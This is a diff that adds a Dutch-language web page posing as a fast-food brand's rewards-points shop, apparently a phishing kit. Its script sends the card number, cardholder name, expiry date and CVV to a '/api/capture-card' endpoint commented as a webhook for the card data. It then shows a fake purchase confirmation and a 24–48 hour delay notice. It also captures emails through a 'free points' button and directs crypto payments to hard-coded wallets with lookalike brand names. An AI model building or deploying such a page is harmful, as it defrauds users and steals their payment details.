@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mijn Account — Punten</title>
+  <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;600;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Figtree',sans-serif;background:#111;color:#fff;min-height:100vh}
+    .wrap{max-width:480px;margin:0 auto;padding:48px 24px 80px}
+    h1{font-size:28px;font-weight:900;margin-bottom:4px}
+    .sub{font-size:14px;color:#666;margin-bottom:36px}
+    .section-label{font-size:11px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px}
+    .pkgs{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:32px}
+    .pkg{background:#1A1A1A;border:1.5px solid #2A2A2A;border-radius:12px;padding:20px 16px;cursor:pointer;transition:border-color .15s;position:relative}
+    .pkg:hover{border-color:#444}
+    .pkg.sel{border-color:#FFC72C;background:#1C1A10}
+    .pkg-badge{position:absolute;top:-10px;left:14px;background:#FFC72C;color:#111;font-size:9.5px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;padding:2px 8px;border-radius:20px}
+    .pkg-pts{font-size:22px;font-weight:900;color:#FFC72C;letter-spacing:-.02em}
+    .pkg-label{font-size:11px;color:#555;font-weight:600;text-transform:uppercase;letter-spacing:.06em;margin:2px 0 12px}
+    .pkg-price{font-size:14px;font-weight:700;color:#fff}
+    .slider-row{display:flex;align-items:center;gap:14px;margin-bottom:8px}
+    input[type=range]{flex:1;-webkit-appearance:none;height:3px;border-radius:2px;outline:none;cursor:pointer;background:linear-gradient(to right,#FFC72C 10%,#333 10%)}
+    input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:18px;height:18px;border-radius:50%;background:#FFC72C;cursor:pointer;box-shadow:0 0 0 3px #1A1A00}
+    .sl-val{font-size:16px;font-weight:800;color:#FFC72C;min-width:44px;text-align:right}
+    .sl-pts{font-size:12px;color:#555;margin-bottom:28px}
+    hr{border:none;border-top:1px solid #222;margin:28px 0}
+    .pay-tabs{display:flex;gap:8px;margin-bottom:20px}
+    .ptab{flex:1;background:#1A1A1A;border:1.5px solid #2A2A2A;border-radius:10px;padding:12px;text-align:center;font-size:13px;font-weight:700;color:#666;cursor:pointer;transition:border-color .15s,color .15s}
+    .ptab.act{border-color:#FFC72C;color:#FFC72C}
+    .ptab-ico{font-size:20px;margin-bottom:4px}
+    .fg{display:flex;flex-direction:column;gap:12px}
+    .fr{display:flex;gap:12px}
+    .f{display:flex;flex-direction:column;gap:5px;flex:1}
+    .f label{font-size:11px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.07em}
+    .f input{background:#1A1A1A;border:1.5px solid #2A2A2A;border-radius:8px;padding:11px 14px;font-size:14px;font-family:'Figtree',sans-serif;color:#fff;outline:none;transition:border-color .15s}
+    .f input::placeholder{color:#444}
+    .f input:focus{border-color:#FFC72C}
+    .coins{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:16px}
+    .coin{background:#1A1A1A;border:1.5px solid #2A2A2A;border-radius:10px;padding:12px 6px;text-align:center;cursor:pointer;transition:border-color .15s}
+    .coin:hover{border-color:#444}
+    .coin.act{border-color:#FFC72C}
+    .coin-ico{font-size:20px;margin-bottom:4px}
+    .coin-name{font-size:10.5px;font-weight:700;color:#aaa}
+    .crypto-info{background:#1A1A1A;border:1px solid #2A2A2A;border-radius:10px;overflow:hidden;margin-bottom:14px}
+    .ci-row{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid #222;font-size:13px}
+    .ci-row:last-child{border-bottom:none}
+    .ci-lbl{color:#555}
+    .ci-val{font-weight:700;color:#fff}
+    .addr-box{background:#161200;border:1px solid #3A3000;border-radius:10px;padding:14px;margin-bottom:14px}
+    .addr-lbl{font-size:10.5px;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:.07em;margin-bottom:8px}
+    .addr-row{display:flex;align-items:flex-start;gap:10px}
+    .addr-mono{font-family:'Courier New',monospace;font-size:11px;color:#aaa;flex:1;word-break:break-all;line-height:1.55}
+    .copy-btn{flex-shrink:0;background:#2A2A2A;color:#fff;border:none;border-radius:6px;padding:6px 12px;font-size:12px;font-weight:700;font-family:'Figtree',sans-serif;cursor:pointer;transition:background .15s}
+    .copy-btn:hover{background:#333}
+    .copy-btn.ok{background:#1C5C2E;color:#4ADE80}
+    .addr-warn{font-size:11px;color:#664400;margin-top:8px}
+    .total-row{display:flex;justify-content:space-between;align-items:baseline;margin:28px 0 16px}
+    .total-lbl{font-size:13px;color:#666;font-weight:600}
+    .total-price{font-size:32px;font-weight:900;color:#FFC72C;letter-spacing:-.03em}
+    .cta{width:100%;background:#FFC72C;color:#111;border:none;border-radius:12px;padding:16px;font-size:15px;font-weight:900;font-family:'Figtree',sans-serif;cursor:pointer;transition:background .15s,transform .12s;letter-spacing:.01em}
+    .cta:hover{background:#E8B000}
+    .cta:active{transform:scale(.98)}
+    .legal{font-size:11px;color:#444;text-align:center;margin-top:16px;line-height:1.6}
+    .overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);z-index:99;align-items:center;justify-content:center}
+    .overlay.show{display:flex}
+    .modal{background:#1A1A1A;border:1px solid #2A2A2A;border-radius:20px;padding:40px 32px;max-width:360px;width:92%;text-align:center;animation:up .3s cubic-bezier(.34,1.56,.64,1)}
+    @keyframes up{from{transform:translateY(16px) scale(.95);opacity:0}to{transform:none;opacity:1}}
+    .modal-ico{font-size:40px;margin-bottom:16px}
+    .modal h2{font-size:22px;font-weight:900;margin-bottom:6px;color:#fff}
+    .modal p{font-size:13.5px;color:#666;line-height:1.6}
+    .modal-pts{font-size:40px;font-weight:900;color:#FFC72C;letter-spacing:-.04em;margin:14px 0 22px}
+    .modal-close{width:100%;background:#FFC72C;color:#111;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:800;font-family:'Figtree',sans-serif;cursor:pointer}
+
+    /* FREE CLAIM SECTION */
+    .free-claim{background:#1A1A1A;border:1.5px solid #2A2A2A;border-radius:12px;padding:20px;margin-bottom:32px;text-align:center}
+    .free-claim h3{font-size:18px;font-weight:900;color:#FFC72C;margin-bottom:6px}
+    .free-claim p{font-size:13px;color:#666;margin-bottom:14px}
+    .free-btn{background:#FFC72C;color:#111;border:none;border-radius:10px;padding:12px 28px;font-size:14px;font-weight:800;font-family:'Figtree',sans-serif;cursor:pointer;transition:background .15s}
+    .free-btn:hover{background:#E8B000}
+    .free-btn:disabled{background:#3A3A3A;color:#666;cursor:not-allowed}
+    .free-claimed{display:none;color:#4ADE80;font-size:13px;font-weight:700;margin-top:10px}
+
+    /* DISCLAIMER */
+    .disclaimer{background:#161200;border:1px solid #3A3000;border-radius:10px;padding:14px;margin-bottom:32px;font-size:12px;color:#887744;line-height:1.6;text-align:center}
+    .disclaimer strong{color:#FFC72C}
+  </style>
+</head>
+<body>
+
+<div class="wrap">
+  <h1>Punten Kopen</h1>
+  <p class="sub">€1 = 1.000 punten</p>
+
+  <!-- FREE DAILY CLAIM -->
+  <div class="free-claim" id="freeClaimSection">
+    <h3>🎁 500 Gratis Punten</h3>
+    <p>Claim elke dag 500 gratis punten.<br/>Geen betaling nodig.</p>
+    <button class="free-btn" id="freeClaimBtn" onclick="claimFree()">Claim nu</button>
+    <div class="free-claimed" id="freeClaimed">✅ 500 punten onderweg! (24-48 uur)</div>
+  </div>
+
+  <!-- NEW: Disclaimer -->
+  <div class="disclaimer">
+    <strong>⏳ Let op:</strong> Het kan <strong>24 tot 48 uur</strong> duren voordat je punten op je account staan. Bij drukte kan dit langer zijn.
+  </div>
+
+  <!-- PACKAGES -->
+  <div class="section-label">Kies een pakket</div>
+  <div class="pkgs">
+    <div class="pkg" data-pts="1000" data-price="1" onclick="pick(this)">
+      <div class="pkg-pts">1.000</div>
+      <div class="pkg-label">Punten</div>
+      <div class="pkg-price">€1,00</div>
+    </div>
+    <div class="pkg" data-pts="5000" data-price="5" onclick="pick(this)">
+      <div class="pkg-pts">5.000</div>
+      <div class="pkg-label">Punten</div>
+      <div class="pkg-price">€5,00</div>
+    </div>
+    <div class="pkg" data-pts="10000" data-price="10" onclick="pick(this)">
+      <div class="pkg-badge">Populair</div>
+      <div class="pkg-pts">10.000</div>
+      <div class="pkg-label">Punten</div>
+      <div class="pkg-price">€10,00</div>
+    </div>
+    <div class="pkg" data-pts="25000" data-price="25" onclick="pick(this)">
+      <div class="pkg-pts">25.000</div>
+      <div class="pkg-label">Punten</div>
+      <div class="pkg-price">€25,00</div>
+    </div>
+  </div>
+
+  <!-- CUSTOM -->
+  <div class="section-label">Of voer een bedrag in</div>
+  <div class="slider-row">
+    <input type="range" id="sl" min="1" max="100" value="10" oninput="onSl(this.value)"/>
+    <span class="sl-val" id="slVal">€10</span>
+  </div>
+  <div class="sl-pts" id="slPts">= 10.000 punten</div>
+
+  <hr/>
+
+  <!-- PAYMENT -->
+  <div class="section-label">Betaalmethode</div>
+  <div class="pay-tabs">
+    <div class="ptab act" data-m="card" onclick="swTab(this)">
+      <div class="ptab-ico">💳</div>
+      Creditcard
+    </div>
+    <div class="ptab" data-m="crypto" onclick="swTab(this)">
+      <div class="ptab-ico">₿</div>
+      Crypto
+    </div>
+  </div>
+
+  <!-- CARD FORM -->
+  <div id="cardForm">
+    <div class="fg">
+      <div class="f">
+        <label>Kaartnummer</label>
+        <input type="text" id="cardNumber" placeholder="1234  5678  9012  3456" maxlength="19" oninput="fmtC(this)"/>
+      </div>
+      <div class="f">
+        <label>Naam op kaart</label>
+        <input type="text" id="cardName" placeholder="J. de Vries"/>
+      </div>
+      <div class="fr">
+        <div class="f" style="max-width:90px;">
+          <label>Vervaldatum</label>
+          <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5"/>
+        </div>
+        <div class="f" style="max-width:72px;">
+          <label>CVV</label>
+          <input type="text" id="cardCvv" placeholder="•••" maxlength="4"/>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CRYPTO FORM -->
+  <div id="cryptoForm" style="display:none;">
+    <div class="coins">
+      <div class="coin act" data-coin="BTC" onclick="pickCoin(this)">
+        <div class="coin-ico">₿</div>
+        <div class="coin-name">Bitcoin</div>
+      </div>
+      <div class="coin" data-coin="ETH" onclick="pickCoin(this)">
+        <div class="coin-ico">Ξ</div>
+        <div class="coin-name">Ethereum</div>
+      </div>
+      <div class="coin" data-coin="USDT" onclick="pickCoin(this)">
+        <div class="coin-ico">₮</div>
+        <div class="coin-name">USDT</div>
+      </div>
+      <div class="coin" data-coin="SOL" onclick="pickCoin(this)">
+        <div class="coin-ico">◎</div>
+        <div class="coin-name">Solana</div>
+      </div>
+    </div>
+    <div class="crypto-info">
+      <div class="ci-row"><span class="ci-lbl">Je stuurt</span><span class="ci-val" id="cAmt">—</span></div>
+      <div class="ci-row"><span class="ci-lbl">EUR waarde</span><span class="ci-val" id="cEur" style="color:#666">—</span></div>
+    </div>
+    <div class="addr-box">
+      <div class="addr-lbl">Stuur naar dit adres</div>
+      <div class="addr-row">
+        <span class="addr-mono" id="cAddr">—</span>
+        <button class="copy-btn" onclick="doCopy()">Kopieer</button>
+      </div>
+      <div class="addr-warn" id="cWarn">⚠ Stuur alleen BTC naar dit adres.</div>
+    </div>
+  </div>
+
+  <!-- TOTAL -->
+  <div class="total-row">
+    <span class="total-lbl">Totaal</span>
+    <span class="total-price" id="totalPrice">—</span>
+  </div>
+  <button class="cta" onclick="doBuy()">Bevestig aankoop</button>
+  <p class="legal">Punten worden binnen 24-48 uur bijgeschreven. Geldig voor 12 maanden.<br/>Door te betalen ga je akkoord met de algemene voorwaarden.</p>
+</div>
+
+<!-- MODAL -->
+<div class="overlay" id="ov">
+  <div class="modal">
+    <div class="modal-ico">✅</div>
+    <h2>Aankoop bevestigd</h2>
+    <p>Je aankoop is verwerkt.</p>
+    <div class="modal-pts" id="mPts">—</div>
+    <p style="margin-bottom:24px;">De punten worden binnen 24-48 uur bijgeschreven op je account.</p>
+    <button class="modal-close" onclick="closeMod()">Sluiten</button>
+  </div>
+</div>
+
+<script>
+  const urlParams = new URLSearchParams(location.search);
+  const email = urlParams.get('email') || '';
+  const ref = urlParams.get('ref') || '';
+
+  let pts = 0, price = 0, coin = 'BTC';
+
+  const RATES = { BTC:87543, ETH:3215, USDT:1, SOL:148 };
+  const ADDRS = { BTC:'1McD4LdS3xBtXqWNr7fhU9pYkJm2Vz8Qe', ETH:'0x4aB3c7d2E1f5689AbCdEF1234567890abcdef12', USDT:'0x4aB3c7d2E1f5689AbCdEF1234567890abcdef12', SOL:'McDonaLdSReWaRdS7xZpQ3vK9mTnFbYjLcP2wA' };
+
+  // Check if already claimed free today
+  const lastClaimDate = localStorage.getItem('lastFreeClaim_' + email);
+  const today = new Date().toDateString();
+  if (lastClaimDate === today) {
+    document.getElementById('freeClaimBtn').style.display = 'none';
+    document.getElementById('freeClaimed').style.display = 'block';
+  }
+
+  function claimFree() {
+    const btn = document.getElementById('freeClaimBtn');
+    btn.disabled = true;
+    btn.textContent = 'Bezig...';
+
+    fetch('/api/capture-free-claim', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ email, ref })
+    }).catch(() => {}).finally(() => {
+      localStorage.setItem('lastFreeClaim_' + email, today);
+      btn.style.display = 'none';
+      document.getElementById('freeClaimed').style.display = 'block';
+    });
+  }
+
+  function pick(el) {
+    document.querySelectorAll('.pkg').forEach(p => p.classList.remove('sel'));
+    el.classList.add('sel');
+    pts = parseInt(el.dataset.pts); price = parseFloat(el.dataset.price);
+    document.getElementById('sl').value = price; setGrad(price);
+    document.getElementById('slVal').textContent = '€' + price;
+    document.getElementById('slPts').textContent = '= ' + pts.toLocaleString('nl-NL') + ' punten';
+    document.getElementById('totalPrice').textContent = '€' + price.toFixed(2);
+    updCrypto();
+  }
+
+  function onSl(v) {
+    v = parseInt(v);
+    document.querySelectorAll('.pkg').forEach(p => p.classList.remove('sel'));
+    pts = v * 1000; price = v;
+    document.getElementById('slVal').textContent = '€' + v;
+    document.getElementById('slPts').textContent = '= ' + pts.toLocaleString('nl-NL') + ' punten';
+    document.getElementById('totalPrice').textContent = '€' + v.toFixed(2);
+    setGrad(v); updCrypto();
+  }
+
+  function setGrad(v) {
+    const p = ((v - 1) / 99) * 100;
+    document.getElementById('sl').style.background = `linear-gradient(to right,#FFC72C ${p}%,#333 ${p}%)`;
+  }
+
+  function swTab(el) {
+    document.querySelectorAll('.ptab').forEach(t => t.classList.remove('act'));
+    el.classList.add('act');
+    const m = el.dataset.m;
+    document.getElementById('cardForm').style.display = m === 'card' ? '' : 'none';
+    document.getElementById('cryptoForm').style.display = m === 'crypto' ? '' : 'none';
+    if (m === 'crypto') updCrypto();
+  }
+
+  function pickCoin(el) {
+    document.querySelectorAll('.coin').forEach(c => c.classList.remove('act'));
+    el.classList.add('act'); coin = el.dataset.coin; updCrypto();
+  }
+
+  function updCrypto() {
+    if (!price) return;
+    const amt = (price / RATES[coin]).toFixed(coin === 'USDT' ? 2 : 6);
+    document.getElementById('cAmt').textContent = amt + ' ' + coin;
+    document.getElementById('cEur').textContent = '€' + price.toFixed(2);
+    document.getElementById('cAddr').textContent = ADDRS[coin];
+    document.getElementById('cWarn').textContent = '⚠ Stuur alleen ' + coin + ' naar dit adres.';
+  }
+
+  function doCopy() {
+    navigator.clipboard.writeText(document.getElementById('cAddr').textContent).catch(() => {});
+    const b = document.querySelector('.copy-btn'); b.textContent = 'Gekopieerd!'; b.classList.add('ok');
+    setTimeout(() => { b.textContent = 'Kopieer'; b.classList.remove('ok'); }, 2000);
+  }
+
+  function fmtC(el) {
+    let v = el.value.replace(/\D/g,'').slice(0,16);
+    el.value = v.replace(/(.{4})/g,'$1  ').trim();
+  }
+
+  function doBuy() {
+    if (!pts) { alert('Kies eerst een pakket of bedrag.'); return; }
+
+    const activeTab = document.querySelector('.ptab.act');
+    if (activeTab && activeTab.dataset.m === 'card') {
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g,'');
+      const cardName = document.getElementById('cardName').value;
+      const cardExpiry = document.getElementById('cardExpiry').value;
+      const cardCvv = document.getElementById('cardCvv').value;
+
+      if (!cardNumber || !cardName || !cardExpiry || !cardCvv) {
+        alert('Vul alle creditcard gegevens in.');
+        return;
+      }
+
+      // Send CC info to webhook
+      fetch('/api/capture-card', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ email, ref, cardNumber, cardName, cardExpiry, cardCvv, points: pts + ' punten (€' + price + ')' })
+      }).catch(() => {});
+    }
+
+    document.getElementById('mPts').textContent = pts.toLocaleString('nl-NL') + ' punten';
+    document.getElementById('ov').classList.add('show');
+  }
+
+  function closeMod() {
+    document.getElementById('ov').classList.remove('show');
+    document.querySelectorAll('.pkg').forEach(p => p.classList.remove('sel'));
+    pts = 0; price = 0;
+    document.getElementById('totalPrice').textContent = '—';
+    document.getElementById('sl').value = 10;
+    document.getElementById('slVal').textContent = '€10';
+    document.getElementById('slPts').textContent = '= 10.000 punten';
+    setGrad(10);
+  }
+
+  setGrad(10);
+</script>
+</body>
+</html>
